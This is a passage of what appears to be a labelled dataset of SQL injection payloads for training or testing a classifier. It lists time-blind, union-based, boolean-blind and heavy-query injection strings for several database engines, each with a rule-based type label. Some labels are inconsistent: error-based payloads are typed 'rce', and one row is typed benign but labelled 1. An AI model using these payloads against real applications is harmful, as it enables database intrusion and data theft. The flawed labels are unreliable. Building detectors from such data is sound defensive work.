row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9376,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9377,"1 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
9378,"1"" where 4073 = 4073 rlike ( select ( case when ( 8716 = 4281 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
9379,"1"" ) ) ) union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9380,"waitfor delay '0:0:5' and ( ( ""%"" = """,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9381,"1"" ) where 2312 = 2312 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
9382,"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",1,,boolean_blind,generic,0.95,1600 = 1600 or detected — boolean_blind injection (priority 8) on generic,rule-based
9383,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9384,"1"" ) ) and sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
9385,"-5925 ) where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9386,"1"" ) where 2873 = 2873 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
9387,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) # usus",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
9388,"1"" where 6004 = 6004",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9389,"1"" ) ) as svim where 4924 = 4924 and 7932 = 5870",1,,boolean_blind,generic,0.95,4924 = 4924 and detected — boolean_blind injection (priority 8) on generic,rule-based
